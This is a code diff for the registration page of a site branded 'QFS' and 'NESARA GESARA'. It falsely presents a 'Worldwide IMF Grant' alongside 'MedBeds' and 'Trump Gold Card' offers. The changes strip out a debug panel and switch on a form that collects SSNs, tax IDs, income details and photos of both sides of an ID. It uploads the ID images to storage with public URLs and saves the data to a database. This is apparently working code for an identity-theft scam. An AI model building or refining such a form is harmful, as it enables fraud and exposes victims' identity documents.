@@ -36,47 +36,6 @@
       border-color: #ef4444 !important;
       border-width: 2px !important;
     }
-    #debugPanel {
-      background: #f0f0f0;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-      padding: 10px;
-      margin-top: 20px;
-      font-family: monospace;
-      font-size: 12px;
-      max-height: 400px;
-      overflow-y: auto;
-      display: block;
-    }
-    .debug-header {
-      font-weight: bold;
-      margin-bottom: 5px;
-      cursor: pointer;
-      color: #2563eb;
-    }
-    .success {
-      color: #059669;
-      font-weight: bold;
-    }
-    .error {
-      color: #dc2626;
-      font-weight: bold;
-    }
-    .schema-box {
-      background: #e6f7ff;
-      border: 2px solid #1890ff;
-      border-radius: 8px;
-      padding: 15px;
-      margin: 10px 0;
-      font-size: 14px;
-    }
-    .column-list {
-      font-family: monospace;
-      background: white;
-      padding: 10px;
-      border-radius: 5px;
-      border: 1px solid #ccc;
-    }
   </style>
   <!-- Load config FIRST, then Supabase -->
   <script src="config.js"></script>
@@ -126,7 +85,7 @@
         </div>
       </div>
 
-      <!-- NORMAL FIELDS (will be hidden for IMF) -->
+      <!-- NORMAL FIELDS (will be hidden ONLY for IMF) -->
       <div id="normalFields">
         <!-- DOB / PHONE / GENDER -->
         <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mt-4">
@@ -156,7 +115,7 @@
           <input id="regEmail" type="email" name="email" required class="w-full mt-1 p-3 border rounded-lg">
         </div>
 
-        <!-- PASSWORD SECTION -->
+        <!-- PASSWORD SECTION (hidden ONLY for IMF) -->
         <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mt-4" id="passwordSection">
           <div>
             <label class="font-semibold required-label">Create Password</label>
@@ -213,11 +172,6 @@
         <h3 class="text-xl font-bold text-blue-800">🌍 WORLDWIDE IMF GRANT APPLICATION</h3>
         <p class="text-sm text-gray-600 mb-4">Please fill all fields below. They are all required.</p>
 
-        <!-- Name display -->
-        <div class="bg-blue-50 p-4 rounded-lg mb-4">
-          <p class="text-sm font-semibold">Your name from above will be used: <span id="imfNameDisplay"></span></p>
-        </div>
-
         <!-- SSN -->
         <div>
           <label class="font-semibold required-label">SSN</label>
@@ -234,10 +188,10 @@
           <input type="file" name="imf_id_back" id="imf_id_back" accept=".jpg,.jpeg,.png,.pdf" class="imf-field w-full mt-1 p-2 border rounded-lg">
         </div>
 
-        <!-- Email -->
+        <!-- Email (uses same email from above) -->
         <div>
           <label class="font-semibold required-label">Email Address</label>
-          <input type="email" name="imf_email" id="imf_email" class="imf-field w-full mt-1 p-3 border rounded-lg" placeholder="Your email address">
+          <input type="email" name="imf_email" id="imf_email" class="imf-field w-full mt-1 p-3 border rounded-lg" placeholder="Your email address" value="">
         </div>
 
         <!-- Grant Amount -->
@@ -316,21 +270,10 @@
           <textarea name="imf_purpose" id="imf_purpose" placeholder="Please explain why you need this grant" rows="3" class="imf-field w-full mt-1 p-3 border rounded-lg"></textarea>
         </div>
 
-        <p class="text-xs text-gray-500 mt-4">By submitting, you agree to the IMF grant terms. All fields are required.</p>
+        <p class="text-xs text-gray-500 mt-4">By submitting, you agree to the IMF grant terms. All fields are required. No Supabase account will be created.</p>
       </div>
 
       <div id="regMsg" class="text-sm text-center hidden"></div>
-      
-      <!-- Debug Panel -->
-      <div class="debug-header">🔧 Database Schema Debug Info</div>
-      <div id="debugPanel">
-        <div>Click "Check Table Schema" button below to see actual columns...</div>
-      </div>
-      
-      <!-- Add a button to check schema -->
-      <button id="checkSchemaBtn" type="button" class="w-full bg-green-600 text-white font-semibold p-2 rounded-lg hover:bg-green-700 transition mb-4">
-        🔍 Check Table Schema (Show Actual Columns)
-      </button>
       
       <button id="regSubmit" type="submit" class="w-full bg-blue-600 text-white font-semibold p-3 rounded-lg hover:bg-blue-700 transition disabled:opacity-50 disabled:cursor-not-allowed">
         Submit Registration
@@ -340,25 +283,6 @@
 
   <script>
     (() => {
-      // Debug logging function
-      function debugLog(message, data = null) {
-        console.log("🔍", message, data || '');
-        const panel = document.getElementById('debugPanel');
-        if (panel) {
-          const line = document.createElement('div');
-          const timestamp = new Date().toLocaleTimeString();
-          if (message.includes('✅')) {
-            line.innerHTML = `<span class="success">[${timestamp}] ${message}</span>`;
-          } else if (message.includes('❌') || message.includes('error')) {
-            line.innerHTML = `<span class="error">[${timestamp}] ${message}</span>`;
-          } else {
-            line.textContent = `[${timestamp}] ${message} ${data ? JSON.stringify(data) : ''}`;
-          }
-          panel.appendChild(line);
-          panel.scrollTop = panel.scrollHeight;
-        }
-      }
-
       // Check if config is loaded
       if (!window.__QFS_CONFIG) {
         console.error("Config not loaded! Make sure config.js is loaded first.");
@@ -367,11 +291,8 @@
           msgEl.textContent = "Configuration error. Please refresh.";
           msgEl.classList.remove('hidden');
         }
-        debugLog("❌ ERROR: Config not loaded");
         return;
       }
-
-      debugLog("✅ Config loaded");
 
       // Use the actual config values
       const SUPABASE_URL = window.__QFS_CONFIG.SUPABASE_URL;
@@ -381,114 +302,9 @@
       let supabase;
       try {
         supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
-        debugLog("✅ Supabase initialized");
       } catch (err) {
         console.error("Failed to initialize Supabase:", err);
-        debugLog("❌ Supabase init failed: " + err.message);
         return;
-      }
-
-      // Function to check table schema
-      async function checkTableSchema() {
-        debugLog("🔍 Attempting to get table schema...");
-        
-        try {
-          // Try to get the table schema using a raw query
-          const { data, error } = await supabase
-            .from('imf_applications')
-            .select('*')
-            .limit(1);
-            
-          if (error) {
-            debugLog("❌ Error: " + error.message);
-            
-            // Try to get column info from the error message
-            if (error.message.includes('Could not find')) {
-              const matches = error.message.match(/Could not find the '(.+?)'/g);
-              if (matches) {
-                debugLog("❌ Missing columns:", matches);
-              }
-            }
-            
-            // Alternative: Try to get schema by attempting to insert a record with all possible fields
-            // This will tell us which columns exist
-            const testData = {
-              test: 'test'
-            };
-            
-            const { error: insertError } = await supabase
-              .from('imf_applications')
-              .insert([testData]);
-              
-            if (insertError) {
-              debugLog("📊 Schema info from error: " + insertError.message);
-              
-              // Parse the error message to find valid columns
-              // Sometimes the error message lists the valid columns
-              const columnMatch = insertError.message.match(/Expected columns: (.*?)(?:\s|$)/);
-              if (columnMatch) {
-                const columns = columnMatch[1].split(',').map(c => c.trim());
-                debugLog("✅ Expected columns:", columns);
-                
-                // Display columns prominently
-                const panel = document.getElementById('debugPanel');
-                const schemaDiv = document.createElement('div');
-                schemaDiv.className = 'schema-box';
-                schemaDiv.innerHTML = `
-                  <strong style="font-size: 16px;">📋 TABLE COLUMNS:</strong><br><br>
-                  <div class="column-list">
-                    ${columns.map(col => `• ${col}`).join('<br>')}
-                  </div>
-                  <br>
-                  <strong>Use these exact column names in your form</strong>
-                `;
-                panel.appendChild(schemaDiv);
-              }
-            }
-          } else if (data && data.length > 0) {
-            const columns = Object.keys(data[0]);
-            debugLog("✅ EXISTING COLUMNS:", columns);
-            
-            // Display columns prominently
-            const panel = document.getElementById('debugPanel');
-            const schemaDiv = document.createElement('div');
-            schemaDiv.className = 'schema-box';
-            schemaDiv.innerHTML = `
-              <strong style="font-size: 16px;">📋 TABLE COLUMNS:</strong><br><br>
-              <div class="column-list">
-                ${columns.map(col => `• ${col}`).join('<br>')}
-              </div>
-              <br>
-              <strong>Use these exact column names in your form</strong>
-            `;
-            panel.appendChild(schemaDiv);
-          } else {
-            debugLog("Table is empty, trying alternative method...");
-            
-            // Try a different approach - use the Supabase REST API to get table info
-            try {
-              const { data: rpcData, error: rpcError } = await supabase.rpc('get_table_info', {
-                table_name: 'imf_applications'
-              });
-              
-              if (rpcError) {
-                debugLog("RPC method failed: " + rpcError.message);
-              } else if (rpcData) {
-                debugLog("Table info:", rpcData);
-              }
-            } catch (rpcErr) {
-              debugLog("RPC error: " + rpcErr.message);
-            }
-          }
-        } catch (err) {
-          debugLog("❌ Schema check error: " + err.message);
-        }
-      }
-
-      // Add click handler for schema check button
-      const checkSchemaBtn = document.getElementById('checkSchemaBtn');
-      if (checkSchemaBtn) {
-        checkSchemaBtn.addEventListener('click', checkTableSchema);
       }
 
       // Get DOM elements
@@ -500,6 +316,7 @@
       const formTitle = document.getElementById("formTitle");
       const msg = document.getElementById("regMsg");
       const btn = document.getElementById("regSubmit");
+      const passwordSection = document.getElementById("passwordSection");
       
       // Regular fields
       const emailEl = document.getElementById("regEmail");
@@ -510,25 +327,9 @@
       const lastNameEl = document.getElementById("lastName");
       const countryEl = document.getElementById("countryEl");
       
-      // Get all normal fields that need required toggling
-      const normalRequiredFields = [
-        document.getElementById("dob"),
-        document.getElementById("phone"),
-        document.getElementById("gender"),
-        document.getElementById("regEmail"),
-        document.getElementById("regPass1"),
-        document.getElementById("regPass2"),
-        document.getElementById("payment_option"),
-        document.getElementById("street_address"),
-        document.getElementById("city"),
-        document.getElementById("state"),
-        document.getElementById("zip"),
-        document.getElementById("countryEl")
-      ];
-      
       // IMF fields
       const imfFields = document.querySelectorAll('.imf-field');
-      const imfNameDisplay = document.getElementById('imfNameDisplay');
+      const imfEmail = document.getElementById('imf_email');
 
       // Gold card elements
       const goldOption = document.getElementById("goldOption");
@@ -540,7 +341,6 @@
         msg.textContent = text;
         msg.className = "text-sm text-center " + (isSuccess ? "text-emerald-600" : "text-red-600");
         msg.classList.remove("hidden");
-        debugLog((isSuccess ? "✅" : "❌") + " Message: " + text);
         
         // Auto hide success messages after 5 seconds
         if (isSuccess) {
@@ -565,35 +365,22 @@
         field.addEventListener('change', clearBorderOnInput);
       });
 
-      // Update IMF name display
-      function updateImfNameDisplay() {
-        if (!imfNameDisplay) return;
-        const first = firstNameEl ? firstNameEl.value.trim() : '';
-        const middle = middleNameEl ? middleNameEl.value.trim() : '';
-        const last = lastNameEl ? lastNameEl.value.trim() : '';
-        const fullName = [first, middle, last].filter(Boolean).join(' ');
-        imfNameDisplay.textContent = fullName || '[Your full name]';
+      // Copy email from main email to IMF email when changed
+      if (emailEl && imfEmail) {
+        emailEl.addEventListener('input', function() {
+          imfEmail.value = this.value;
+        });
       }
 
-      if (firstNameEl) firstNameEl.addEventListener('input', updateImfNameDisplay);
-      if (middleNameEl) middleNameEl.addEventListener('input', updateImfNameDisplay);
-      if (lastNameEl) lastNameEl.addEventListener('input', updateImfNameDisplay);
-
-      // Toggle IMF mode
+      // Toggle IMF mode - ONLY hides password and normal fields for IMF
       function toggleImfMode(enableImf) {
-        debugLog("Toggle IMF mode: " + enableImf);
         if (enableImf) {
-          // Hide normal fields section
+          // Hide normal fields section (including password)
           if (normalFields) normalFields.style.display = "none";
-          
-          // Remove required from all normal fields
-          normalRequiredFields.forEach(field => {
-            if (field) field.required = false;
-          });
           
           // Change title and subtitle for IMF
           if (formTitle) formTitle.textContent = "🌍 Worldwide IMF Grant";
-          if (pageSubtitle) pageSubtitle.textContent = "You are applying for the WORLDWIDE IMF GRANT. Please complete all required fields below.";
+          if (pageSubtitle) pageSubtitle.textContent = "You are applying for the WORLDWIDE IMF GRANT. Please complete all required fields below. No password needed.";
           
           // Show IMF section
           if (imfSection) imfSection.classList.remove("hidden");
@@ -603,16 +390,13 @@
             field.required = true;
           });
           
-          // Update name display
-          updateImfNameDisplay();
+          // Copy email to IMF field
+          if (emailEl && imfEmail) {
+            imfEmail.value = emailEl.value;
+          }
         } else {
-          // Show normal fields
+          // Show normal fields (including password)
           if (normalFields) normalFields.style.display = "block";
-          
-          // Add required back to normal fields
-          normalRequiredFields.forEach(field => {
-            if (field) field.required = true;
-          });
           
           // Restore original title and subtitle
           if (formTitle) formTitle.textContent = "QFS Registration Form";
@@ -661,17 +445,13 @@
         toggleImfMode(true);
       }
 
-      // Form submission handler - COMMENTED OUT until we know the correct columns
+      // Form submission handler
       let busy = false;
       
       if (form) {
         form.addEventListener("submit", async (e) => {
           e.preventDefault();
           
-          showMessage("⚠️ Please click 'Check Table Schema' first to see the correct column names", false);
-          
-          /*
-          // Original submission code - commented out until we know columns
           if (busy) {
             showMessage("Already processing your request...", false);
             return;
@@ -710,7 +490,7 @@
               throw new Error("Last name is required.");
             }
 
-            // Handle IMF submission
+            // Handle IMF submission - NO SUPABASE AUTH, just store in imf_applications
             if (isIMF) {
               // Validate all IMF fields
               let firstInvalid = null;
@@ -739,6 +519,14 @@
                 if (!firstInvalid) firstInvalid = idBack;
               }
               
+              // Check email
+              if (!imfEmail || !imfEmail.value.trim()) {
+                if (imfEmail) {
+                  imfEmail.classList.add('border-red-500');
+                  if (!firstInvalid) firstInvalid = imfEmail;
+                }
+              }
+              
               if (firstInvalid) {
                 firstInvalid.focus();
                 throw new Error("Please fill all required IMF fields and upload both ID images.");
@@ -750,7 +538,6 @@
                 // Upload ID front
                 const fileFront = idFront.files[0];
                 const fileNameFront = `imf_${Date.now()}_front_${fileFront.name.replace(/[^a-z0-9.]/gi, '_')}`;
-                debugLog("Uploading front ID: " + fileNameFront);
                 
                 const { error: uploadErrorFront } = await supabase.storage
                   .from('imf-ids')
@@ -760,12 +547,10 @@
                   });
                   
                 if (uploadErrorFront) throw new Error("Front ID upload failed: " + uploadErrorFront.message);
-                debugLog("✅ Front ID uploaded successfully");
                 
                 // Upload ID back
                 const fileBack = idBack.files[0];
                 const fileNameBack = `imf_${Date.now()}_back_${fileBack.name.replace(/[^a-z0-9.]/gi, '_')}`;
-                debugLog("Uploading back ID: " + fileNameBack);
                 
                 const { error: uploadErrorBack } = await supabase.storage
                   .from('imf-ids')
@@ -775,7 +560,6 @@
                   });
                   
                 if (uploadErrorBack) throw new Error("Back ID upload failed: " + uploadErrorBack.message);
-                debugLog("✅ Back ID uploaded successfully");
                 
                 // Get public URLs
                 const { data: frontPublicUrl } = supabase.storage
@@ -786,28 +570,29 @@
                   .from('imf-ids')
                   .getPublicUrl(fileNameBack);
                 
-                debugLog("Front URL: " + frontPublicUrl?.publicUrl);
-                
                 // Get the grant amount value
                 const grantAmount = document.getElementById('imf_grant_amount').value;
                 
-                // IMPORTANT: We need to get the actual column names from the schema check
+                // Prepare data for imf_applications
                 const imfData = {
-                  // Replace these with the actual column names from your table
-                  // For example, if the column is 'grant_amount' instead of 'imf_amount', use that
-                  imf_name: firstNameEl.value.trim() + ' ' + lastNameEl.value.trim(),
-                  imf_ssn: document.getElementById('imf_ssn').value.trim(),
-                  imf_id: frontPublicUrl?.publicUrl || '',
-                  imf_tax_id: document.getElementById('imf_tax_id').value.trim(),
-                  // CHANGE THIS LINE to match your actual column name
-                  // imf_amount: grantAmount,  // Commented out - replace with correct column
-                  imf_whatsapp: document.getElementById('imf_whatsapp').value.trim(),
-                  imf_income: document.getElementById('imf_monthly_income').value.trim(),
-                  imf_purpose: document.getElementById('imf_purpose').value.trim(),
-                  email: document.getElementById('imf_email').value.trim()
+                  full_name: firstNameEl.value.trim() + ' ' + lastNameEl.value.trim(),
+                  ssn: document.getElementById('imf_ssn').value.trim(),
+                  id_front_url: frontPublicUrl?.publicUrl || '',
+                  id_back_url: backPublicUrl?.publicUrl || '',
+                  email: imfEmail.value.trim(),
+                  grant_amount: grantAmount,
+                  tax_id: document.getElementById('imf_tax_id').value.trim(),
+                  address: document.getElementById('imf_address').value.trim(),
+                  country: document.getElementById('imf_country').value.trim(),
+                  whatsapp: document.getElementById('imf_whatsapp').value.trim(),
+                  phone: document.getElementById('imf_phone').value.trim(),
+                  gender: document.getElementById('imf_gender').value,
+                  dob: document.getElementById('imf_dob').value,
+                  monthly_income: document.getElementById('imf_monthly_income').value.trim(),
+                  purpose: document.getElementById('imf_purpose').value.trim(),
+                  registering_for: 'WORLDWIDE IMF GRANT',
+                  created_at: new Date().toISOString()
                 };
-                
-                debugLog("Submitting IMF data:", imfData);
                 
                 // Insert into imf_applications table
                 const { error: insertError } = await supabase
@@ -815,11 +600,100 @@
                   .insert([imfData]);
                   
                 if (insertError) {
-                  console.error("Insert error details:", insertError);
-                  debugLog("❌ Insert error: " + insertError.message);
-                  
-                  // Try to parse which column is missing
-                  const match = insertError.message.match(/Could not find the '(.+?)'/);
-                  if (match) {
-                    debugLog("❌ Missing column: " + match[1]);
-                    showMessage(`Database column '
+                  console.error("Insert error:", insertError);
+                  throw new Error("Database insert failed: " + insertError.message);
+                }
+                
+                showMessage("✅ IMF application submitted successfully! Your documents are securely stored.", true);
+                
+                // Reset form after success
+                setTimeout(() => {
+                  if (form) form.reset();
+                  toggleImfMode(false);
+                  busy = false;
+                  if (btn) btn.disabled = false;
+                }, 3000);
+                
+              } catch (uploadErr) {
+                console.error("Upload error:", uploadErr);
+                throw new Error(uploadErr.message);
+              }
+              
+              return;
+            }
+            
+            // --- NORMAL REGISTRATION PATH (ALL OTHER OPTIONS) ---
+            // This includes QFS Account, Trump Gold Card, Bitcoin Cards, MedBeds
+            // Validate email
+            if (!emailEl || !emailEl.value.trim()) {
+              if (emailEl) {
+                emailEl.focus();
+                emailEl.classList.add('border-red-500');
+              }
+              throw new Error("Email is required.");
+            }
+            
+            // Validate passwords (required for normal registration)
+            if (!p1 || !p1.value) {
+              if (p1) {
+                p1.focus();
+                p1.classList.add('border-red-500');
+              }
+              throw new Error("Password is required.");
+            }
+            
+            if (p1.value.length < 8) {
+              if (p1) {
+                p1.focus();
+                p1.classList.add('border-red-500');
+              }
+              throw new Error("Password must be at least 8 characters.");
+            }
+            
+            if (p1.value !== p2.value) {
+              if (p2) {
+                p2.focus();
+                p2.classList.add('border-red-500');
+              }
+              throw new Error("Passwords do not match.");
+            }
+            
+            showMessage("Creating your portal account…", true);
+            
+            // Create Supabase auth account (ONLY for non-IMF options)
+            const { error } = await supabase.auth.signUp({
+              email: emailEl.value.trim().toLowerCase(),
+              password: p1.value.trim(),
+              options: {
+                data: {
+                  first_name: firstNameEl ? firstNameEl.value.trim() : '',
+                  middle_name: middleNameEl ? middleNameEl.value.trim() : '',
+                  last_name: lastNameEl ? lastNameEl.value.trim() : '',
+                  registering_for: regFor.value,
+                  country: countryEl ? countryEl.value.trim() : ''
+                },
+                emailRedirectTo: "https://qfsnesaragesara.org/login.html"
+              }
+            });
+            
+            if (error) throw error;
+            
+            showMessage("✅ Account created successfully! Redirecting...", true);
+            
+            // Redirect to success page
+            setTimeout(() => {
+              window.location.href = "https://qfsnesaragesara.org/success-registration.html";
+            }, 2000);
+            
+          } catch (err) {
+            console.error("Registration error:", err);
+            showMessage(err.message, false);
+            busy = false;
+            if (btn) btn.disabled = false;
+          }
+        });
+      }
+    })();
+  </script>
+</body>
+</html>
